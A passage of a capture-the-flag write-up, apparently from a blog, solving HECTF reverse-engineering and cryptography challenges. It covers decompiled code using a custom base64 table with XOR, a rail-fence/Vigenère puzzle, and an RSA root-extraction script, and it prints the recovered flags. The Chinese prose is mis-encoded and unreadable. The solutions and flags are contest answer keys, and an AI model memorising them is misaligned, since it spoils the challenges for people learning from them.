[rsp+60h] [rbp-50h] BYREF</span></span><br><span class="line">  __int16 v14; <span class="comment">// [rsp+90h] [rbp-20h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v15; <span class="comment">// [rsp+98h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v15 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(v13, <span class="number">0</span>, <span class="built_in">sizeof</span>(v13));</span><br><span class="line">  v14 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">63</span>; ++i )</span><br><span class="line">    *((_BYTE *)v13 + i) = dword_2040[i];</span><br><span class="line">  v10 = std::string::<span class="built_in">size</span>(a1);</span><br><span class="line">  v9 = (_WORD *)std::string::<span class="built_in">data</span>(a1);</span><br><span class="line">  std::string::<span class="built_in">basic_string</span>(v11, a2, v2);</span><br><span class="line">  v12 = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; (<span class="type">int</span>)(v10 / <span class="number">3</span>); ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_WORD *)((<span class="type">char</span> *)&amp;v12 + <span class="number">1</span>) = *v9;</span><br><span class="line">    v3 = v9 + <span class="number">1</span>;</span><br><span class="line">    v9 = (_WORD *)((<span class="type">char</span> *)v9 + <span class="number">3</span>);</span><br><span class="line">    <span class="built_in">HIBYTE</span>(v12) = *v3;</span><br><span class="line">    std::string::<span class="keyword">operator</span>+=(v11, (<span class="type">unsigned</span> <span class="type">int</span>)*((<span class="type">char</span> *)v13 + (<span class="built_in">BYTE1</span>(v12) &gt;&gt; <span class="number">2</span>)));</span><br><span class="line">    std::string::<span class="keyword">operator</span>+=(</span><br><span class="line">      v11,</span><br><span class="line">      (<span class="type">unsigned</span> <span class="type">int</span>)*((<span class="type">char</span> *)v13 + (((<span class="type">unsigned</span> __int8)(<span class="number">16</span> * <span class="built_in">BYTE1</span>(v12)) | (<span class="built_in">BYTE2</span>(v12) &gt;&gt; <span class="number">4</span>)) &amp; <span class="number">0x3F</span>)));</span><br><span class="line">    std::string::<span class="keyword">operator</span>+=(</span><br><span class="line">      v11,</span><br><span class="line">      (<span class="type">unsigned</span> <span class="type">int</span>)*((<span class="type">char</span> *)v13 + (((<span class="type">unsigned</span> __int8)(<span class="number">4</span> * <span class="built_in">BYTE2</span>(v12)) | (<span class="built_in">HIBYTE</span>(v12) &gt;&gt; <span class="number">6</span>)) &amp; <span class="number">0x3F</span>)));</span><br><span class="line">    std::string::<span class="keyword">operator</span>+=(v11, (<span class="type">unsigned</span> <span class="type">int</span>)*((<span class="type">char</span> *)v13 + (<span class="built_in">HIBYTE</span>(v12) &amp; <span class="number">0x3F</span>)));</span><br><span class="line">    v6 += <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v6 == <span class="number">76</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      std::string::<span class="keyword">operator</span>+=(v11, <span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">      v6 = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v8 = v10 % <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v8 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">BYTE1</span>(v12) = *(_BYTE *)v9;</span><br><span class="line">    std::string::<span class="keyword">operator</span>+=(v11, (<span class="type">unsigned</span> <span class="type">int</span>)*((<span class="type">char</span> *)v13 + (<span class="built_in">BYTE1</span>(v12) &gt;&gt; <span class="number">2</span>)));</span><br><span class="line">    std::string::<span class="keyword">operator</span>+=(v11, (<span class="type">unsigned</span> <span class="type">int</span>)*((<span class="type">char</span> *)v13 + ((<span class="number">16</span> * <span class="built_in">BYTE1</span>(v12)) &amp; <span class="number">0x30</span>)));</span><br><span class="line">    std::string::<span class="keyword">operator</span>+=(v11, <span class="string">&quot;==&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( v8 == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_WORD *)((<span class="type">char</span> *)&amp;v12 + <span class="number">1</span>) = *v9;</span><br><span class="line">    std::string::<span class="keyword">operator</span>+=(v11, (<span class="type">unsigned</span> <span class="type">int</span>)*((<span class="type">char</span> *)v13 + (<span class="built_in">BYTE1</span>(v12) &gt;&gt; <span class="number">2</span>)));</span><br><span class="line">    std::string::<span class="keyword">operator</span>+=(</span><br><span class="line">      v11,</span><br><span class="line">      (<span class="type">unsigned</span> <span class="type">int</span>)*((<span class="type">char</span> *)v13 + ((<span class="number">16</span> * <span class="built_in">BYTE1</span>(v12)) &amp; <span class="number">0x30</span> | (<span class="type">unsigned</span> <span class="type">int</span>)(<span class="built_in">BYTE2</span>(v12) &gt;&gt; <span class="number">4</span>))));</span><br><span class="line">    std::string::<span class="keyword">operator</span>+=(v11, (<span class="type">unsigned</span> <span class="type">int</span>)*((<span class="type">char</span> *)v13 + ((<span class="number">4</span> * <span class="built_in">BYTE2</span>(v12)) &amp; <span class="number">0x3C</span>)));</span><br><span class="line">    std::string::<span class="keyword">operator</span>+=(v11, <span class="string">&quot;=&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  std::string::<span class="keyword">operator</span>=(a2, v11);</span><br><span class="line">  std::string::~<span class="built_in">string</span>();</span><br><span class="line">  <span class="keyword">return</span> v15 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹è¿™é‡Œå°±æ˜¯å…¸å‹çš„ç®—æ³•è¯†åˆ«ï¼Œå®ç°çš„æ˜¯ä¸€ä¸ª base64 åŠ å¯†ï¼Œå†å°±æ˜¯è¿™ä¸ªå‡½æ•°ï¼Œå¯¹ v6 è¿›è¡Œäº†å¤„ç†ï¼ˆæˆ‘ä»¬è¾“å…¥çš„ flag å°±æ˜¯è¿™ä¸ªï¼‰ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">sub_13A9</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> v2; <span class="comment">// bl</span></span><br><span class="line">  <span class="type">char</span> v3; <span class="comment">// bl</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+18h] [rbp-38h] BYREF</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+20h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 i; <span class="comment">// [rsp+28h] [rbp-28h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v9; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v6 = std::string::<span class="built_in">length</span>(a2);</span><br><span class="line">  v5 = std::string::<span class="built_in">length</span>(a1);</span><br><span class="line">  v8 = *(_QWORD *)<span class="built_in">sub_1DC2</span>(&amp;v5, &amp;v6);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; i &lt; v8; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = *(_BYTE *)std::string::<span class="keyword">operator</span>[](a1, i);</span><br><span class="line">    v3 = *(_BYTE *)std::string::<span class="keyword">operator</span>[](a2, i) ^ v2;</span><br><span class="line">    *(_BYTE *)std::string::<span class="keyword">operator</span>[](a1, i) = v3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v9 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹ä¸è¿‡è¿™ä¸ªå‡½æ•°æ˜¾è€Œæ˜“è§æ˜¯ç”¨æ¥å¹²æ‰°äººçš„ï¼Œè¿™é‡Œå¯¹å­—ç¬¦ä¸²å¼‚æˆ–ä¹‹åå­˜æ”¾çš„æ˜¯ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸²åœ°å€ï¼Œä½† flag æ˜¯ç¬¬äºŒä¸ªå‚æ•°ï¼Œæ‰€ä»¥ç¨‹åºåˆ†æå®Œäº†ï¼Œå…¶ä»–çš„éƒ½ä¸å’‹æœ‰ç”¨äº†ï¼Œä¹‹åå°±æ˜¯ç›´æ¥æ‰¾æ•°æ®ï¼Œåœ¨æœ€åé‚£ä¸ªå¼‚æˆ–å‡½æ•°é‡Œé¢å­˜åœ¨ä¸€ä¸ªæ•°ç»„ dword_4020 [j]ï¼Œæ²¡æœ‰åœ¨å‡½æ•°ä¸­å®šä¹‰è¿‡ï¼Œæ‰€ä»¥ç›´æ¥æ¨æµ‹åœ¨å…¨å±€å˜é‡é‡Œï¼ŒåŒå‡»è·Ÿè¿›æ‰¾åˆ°äº†ï¼Œåœ¨ bss æ®µä¸Šï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.data:0000000000004020 ; _DWORD dword_4020[64]</span><br><span class="line">.data:0000000000004020 dword_4020      dd 81, 67, 84, 67, 85, 66, 90, 118, 79, 70, 72, 115, 92</span><br><span class="line">.data:0000000000004020                                         ; DATA XREF: sub_17A7+F8â†‘o</span><br><span class="line">.data:0000000000004054                 dd 70, 125, 107, 78, 80, 85, 104, 81, 85, 125, 62, 69</span><br><span class="line">.data:0000000000004084                 dd 93, 67, 103, 69, 62, 59, 61, 71, 73, 83, 32, 84, 89</span><br><span class="line">.data:00000000000040B8                 dd 67, 96, 64, 95, 73, 126, 69, 56, 117, 56, 71, 124, 37</span><br><span class="line">.data:00000000000040EC                 dd 41, 90, 125, 89, 99, 95, 70, 87, 56, 95, 66, 121, 40</span><br></pre></td></tr></table></figure><p>â€‹æå–æ•°æ®ï¼Œç„¶åå†™ä¸ªè„šæœ¬ï¼Œæ ¹æ®å¼‚æˆ–ç®—æ³•å†™ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v5; ++i )</span><br><span class="line">  v6[i] = *(<span class="type">char</span> *)std::string::<span class="keyword">operator</span>[](a1, i) ^ (i / <span class="number">3</span>);</span><br></pre></td></tr></table></figure><p>â€‹exp ä¸ºï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">compare</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> flag[])</span></span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> target[] = &#123;<span class="number">81</span>,<span class="number">67</span>,<span class="number">84</span>,<span class="number">67</span>,<span class="number">85</span>,<span class="number">66</span>,<span class="number">90</span>,<span class="number">118</span>,<span class="number">79</span>,<span class="number">70</span>,<span class="number">72</span>,<span class="number">115</span>,<span class="number">92</span>,<span class="number">70</span>,<span class="number">125</span>,<span class="number">107</span>,<span class="number">78</span>,<span class="number">80</span>,<span class="number">85</span>,<span class="number">104</span>,<span class="number">81</span>,<span class="number">85</span>,<span class="number">125</span>,<span class="number">62</span>,<span class="number">69</span>,<span class="number">93</span>,<span class="number">67</span>,<span class="number">103</span>,<span class="number">69</span>,<span class="number">62</span>,<span class="number">59</span>,<span class="number">61</span>,<span class="number">71</span>,<span class="number">73</span>,<span class="number">83</span>,<span class="number">32</span>,<span class="number">84</span>,<span class="number">89</span>,<span class="number">67</span>,<span class="number">96</span>,<span class="number">64</span>,<span class="number">95</span>,<span class="number">73</span>,<span class="number">126</span>,<span class="number">69</span>,<span class="number">56</span>,<span class="number">117</span>,<span class="number">56</span>,<span class="number">71</span>,<span class="number">124</span>,<span class="number">37</span>,<span class="number">41</span>,<span class="number">90</span>,<span class="number">125</span>,<span class="number">89</span>,<span class="number">99</span>,<span class="number">95</span>,<span class="number">70</span>,<span class="number">87</span>,<span class="number">56</span>,<span class="number">95</span>,<span class="number">66</span>,<span class="number">121</span>,<span class="number">40</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">compare</span>(target);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">compare</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> flag[])</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> len = <span class="number">64</span>;</span><br><span class="line">    <span class="type">char</span> f[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; ++i)&#123;</span><br><span class="line">        f[i] = flag[i] ^ i / <span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>;i &lt; len; ++i )&#123;</span><br><span class="line">        std::cout &lt;&lt; f[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//QCTBTCXtMEKpXBynKUSnWRz9MUKnL717MBX+XUOmMRGpK7z7Wl58KlKqMUD+KVm=</span></span><br></pre></td></tr></table></figure><p>â€‹ä¹‹åå°±æ˜¯ base64 è§£å¯†ï¼Œä¸è¿‡è¿™é‡Œå‡ºç°äº†é—®é¢˜ï¼Œbase64 ç›´æ¥è§£å¯†åå‘ç°æœ‰ä¸å¯æ˜¾ç¤ºå­—ç¬¦ï¼Œå¹¶ä¸”å†åœ¨ä¹‹å‰æ²¡æœ‰ä»»ä½•å…³äºæ“ä½œ flag çš„å†…å®¹ï¼Œå¹¶ä¸” flag åº”è¯¥æ˜¯å…¨æ˜¯å¯æ˜¾ç¤ºçš„ <code>HECTF&#123;&#125;</code>  åŒ…èµ·æ¥çš„ï¼Œæ‰€ä»¥åº”è¯¥æ˜¯ base64 å˜è¡¨ï¼Œæ‰¾è¡¨ã€‚</p><p>â€‹åœ¨ä¹‹å‰çš„ base64 åŠ å¯†çš„é‚£ä¸ªå‡½æ•°é‡Œæœ‰ä¸ªæ•°ç»„ <code>dword_2040[i]</code> ï¼Œè·Ÿè¿›çœ‹çœ‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.rodata:0000000000002040 ; _DWORD dword_2040[64]</span><br><span class="line">.rodata:0000000000002040 dword_2040      dd 121, 122, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75</span><br><span class="line">.rodata:0000000000002040                                         ; DATA XREF: sub_1920+7Fâ†‘o</span><br><span class="line">.rodata:0000000000002074                 dd 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88</span><br><span class="line">.rodata:00000000000020A8                 dd 89, 90, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 43</span><br><span class="line">.rodata:00000000000020DC                 dd 47, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107</span><br><span class="line">.rodata:000000000000210C                 dd 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118</span><br><span class="line">.rodata:0000000000002138                 dd 119, 120</span><br></pre></td></tr></table></figure><p>â€‹æå–å‡ºæ¥è¾“å‡ºå‡ºæ¥æ˜¯ï¼šyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/abcdefghijklmnopqrstuvwx</p><p>â€‹æ‰€ä»¥ï¼Œè¿™ä¸ªå°±æ˜¯å˜äº†ä¹‹åçš„è¡¨ï¼Œæ‹¿ç€è¿™ä¸ªå»è§£å¯†ï¼ŒæˆåŠŸå¾—åˆ° flagï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HECTF&#123;8c7d051e5a0e9c567c86fed492720cc8d3389af1&#125;</span><br></pre></td></tr></table></figure><h2 id="crypto"><a class="markdownIt-Anchor" href="#crypto">#</a> Cryptoï¼š</h2><h3 id="è¿·èŒ«çš„è‰¾ç±³è‰"><a class="markdownIt-Anchor" href="#è¿·èŒ«çš„è‰¾ç±³è‰">#</a> è¿·èŒ«çš„è‰¾ç±³è‰</h3><p>Y2w9Iobe_v_Ufbm0ajI05bfzvTP1b_c}{lr</p><p>key:  6</p><p P0fo2bb51lbbmew_0f_rczav9_jv="">YIUIT</p><p><span class="exturl" data-url="aHR0cHM6Ly9jeWJlcmNoZWYub3JnLyNyZWNpcGU9UmFpbF9GZW5jZV9DaXBoZXJfRW5jb2RlKDYsMC9kaXNhYmxlZClSYWlsX0ZlbmNlX0NpcGhlcl9EZWNvZGUoNiwwKQ==">Rail Fence Cipher Encode, 1 more - CyberChef</span></p><p>key:  responsibility</p><p C0ng2at51ations_0n_comin9_in="">HECTF</p><p><span class="exturl" data-url="aHR0cHM6Ly93d3cucXF4aXV6aS5jbi9iaWFubWEvd2VpamluaXlhbWltYS5waHA=">ç»´å‰å°¼äºšå¯†ç åœ¨çº¿åŠ å¯†è§£å¯† - åƒåƒç§€å­— (qqxiuzi.cn)</span></p><h3 id="seven-more"><a class="markdownIt-Anchor" href="#seven-more">#</a> seven more</h3><p>e å’Œ phi ä¸äº’ç´ çš„æƒ…å†µä¸‹å’Œæ¬§æ‹‰å€¼ä¹Ÿä¸äº’ç´  ç”šè‡³ç°åœ¨ e å’Œ q ä¹Ÿä¸äº’ç´ äº†</p><p>ä¸ä¼ ç»Ÿ amm ä¸åŒçš„æ˜¯ è¿˜è¦æ±‚å‡ºæ‰€æœ‰çš„ mq7</p><p>ä»¥ä¸‹æ˜¯è§£å¯†è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = <span class="number">211174039496861685759253930135194075344490160159278597570478160714793843648384778026214533259531963057737358092962077790023796805017455012885781079402008604439036453706912819711606916173828620000813663524065796636039272173716362247511054616756763830945978879273812551204996912252317081836281439680223663883250992957309172746671265758427396929152878633033380299036765665530677963287445843653357154379447802151146728382517702550201</span></span><br><span class="line">c = <span class="number">191928992610587693825282781627928404831411364407297375816921425636703444790996279718679090695773598752804431891678976685083991392082287393228730341768083530729456781668626228660243400914135691435374881498580469432290771039798758412160073826112909167507868640830965603769520664582121780979767127925146139051005022993085473836213944491149411881673257628267851773377966008999511673741955131386600993547529438576918914852633139878066</span></span><br><span class="line">e = <span class="number">1009</span>*<span class="number">7</span></span><br><span class="line">p = <span class="number">31160882390461311665815471693453819123352546432384109928704874241292707178454748381602275005604671000436222741183159072136366212086549437801626015758789167455043851748560416003501637268653712148286072544482747238223</span></span><br><span class="line">q = <span class="number">6776895366785389188349778634427547683984792095011326393872759455291221057085426285502176493658280343252730331506803173791893339840460125807960788857396637337440004750209164671124188980183308151635629356496128717687</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">onemod</span>(<span class="params">e, q</span>):</span><br><span class="line">    p = random.randint(<span class="number">1</span>, q-<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">while</span>(powmod(p, (q-<span class="number">1</span>)//e, q) == <span class="number">1</span>):  <span class="comment"># (r,s)=1</span></span><br><span class="line">        p = random.randint(<span class="number">1</span>, q)</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">AMM_rth</span>(<span class="params">o, r, q</span>):  <span class="comment"># r|(q-1</span></span><br><span class="line">    <span class="keyword">assert</span>((q-<span class="number">1</span>) % r == <span class="number">0</span>)</span><br><span class="line">    p = onemod(r, q)</span><br><span class="line"></span><br><span class="line">    t = <span class="number">0</span></span><br><span class="line">    s = q-<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span>(s % r == <span class="number">0</span>):</span><br><span class="line">        s = s//r</span><br><span class="line">        t += <span class="number">1</span></span><br><span class="line">    k = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span>((s*k+<span class="number">1</span>) % r != <span class="number">0</span>):</span><br><span class="line">        k += <span class="number">1</span></span><br><span class="line">    alp = (s*k+<span class="number">1</span>)//r</span><br><span class="line"></span><br><span class="line">    a = powmod(p, r**(t-<span class="number">1</span>)*s, q)</span><br><span class="line">    b = powmod(o, r*a-<span class="number">1</span>, q)</span><br><span class="line">    c = powmod(p, s, q)</span><br><span class="line">    h = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, t-<span class="number">1</span>):</span><br><span class="line">        d = powmod(<span class="built_in">int</span>(b), r**(t-<span class="number">1</span>-i), q)</span><br><span class="line">        <span class="keyword">if</span> d == <span class="number">1</span>:</span><br><span class="line">            j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            j = (-math.log(d, a)) % r</span><br><span class="line">        b = (b*(c**(r*j))) % q</span><br><span class="line">        h = (h*c**j) % q</span><br><span class="line">        c = (c*r) % q</span><br><span class="line">    result = (powmod(o, alp, q)*h)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">AMM_Solution</span>(<span class="params">m, q, rt, cq, e</span>):</span><br><span class="line">    mp = []</span><br><span class="line">    <span class="keyword">for</span> pr <span class="keyword">in</span> rt:</span><br><span class="line">        r = (pr*m) % q</span><br><span class="line">        <span class="comment"># assert(pow(r, e, q) == cq)</span></span><br><span class="line">        mp.append(r)</span><br><span class="line">    <span class="keyword">return</span> mp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        a = long_to_bytes(m)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;HECTF&#x27;</span> <span class="keyword">in</span> a:</span><br><span class="line">            <span class="built_in">print</span>(a)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">CHECK2</span>(<span class="params">mp, mq, e, p, q</span>):</span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    j = <span class="number">1</span></span><br><span class="line">    t1 = invert(q, p)</span><br><span class="line">    t2 = invert(p, q)</span><br><span class="line">    <span class="keyword">for</span> mp1 <span class="keyword">in</span> mp:</span><br><span class="line">        <span class="keyword">for</span> mq1 <span class="keyword">in</span> mq:</span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> j % <span class="number">100000</span> == <span class="number">0</span>:</span><br><span class="line">                <span class="built_in">print</span>(j)</span><br><span class="line">            ans = (mp1*t1*q+mq1*t2*p) % (p*q)</span><br><span class="line">            <span class="keyword">if</span> check(ans):</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">AMM_ROOT</span>(<span class="params">r, q</span>):</span><br><span class="line">    li = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">len</span>(li) &lt; r):</span><br><span class="line">        p = powmod(random.randint(<span class="number">1</span>, q-<span class="number">1</span>), (q-<span class="number">1</span>)//r, q)</span><br><span class="line">        li.add(p)</span><br><span class="line">    <span class="keyword">return</span> li</span><br><span class="line"></span><br><span class="line">cp = c % p</span><br><span class="line">cq = c % q</span><br><span class="line"></span><br><span class="line">mp = AMM_rth(cp, e, p)</span><br><span class="line">mq = AMM_rth(cq, <span class="number">1009</span>, q)</span><br><span class="line"></span><br><span class="line">rt1 = AMM_ROOT(e, p)</span><br><span class="line">rt2 = AMM_ROOT(<span class="number">1009</span>, q)</span><br><span class="line"></span><br><span class="line">ammp = AMM_Solution(mp, p, rt1, cp, e)</span><br><span class="line">ammq = AMM_Solution(mq, q, rt2, cq, <span class="number">1009</span>)</span><br><span class="line"></span><br><span class="line">d = invert(<span class="number">7</span>, q-<span class="number">1</span>)</span><br><span class="line">mqs = []</span><br><span class="line"><span class="keyword">for</span> mq <span class="keyword">in</span> ammq:</span><br><span class="line">    mqs.append(<span class="built_in">pow</span>(mq, d, q))</span><br><span class="line">ammq = mqs</span><br><span class="line">CHECK2(ammp, ammq, e, p, q)</span><br><span class="line"><span class="comment">##HECTF&#123;go0d_jOb_At_AmM&#125;</span></span><br></pre></td></tr></table></figure><h3 id="ç¿»ä¸€ç¿»"><a class="markdownIt-Anchor" href="#ç¿»ä¸€ç¿»">#</a> ç¿»ä¸€ç¿»ï¼š</h3><p>çˆ†ç ´æ€è·¯ç±»ä¼¼ RSA parity oracleã€‚p,q æ˜¯ bit ç¿»è½¬å…³ç³»ï¼Œ å·²çŸ¥ p 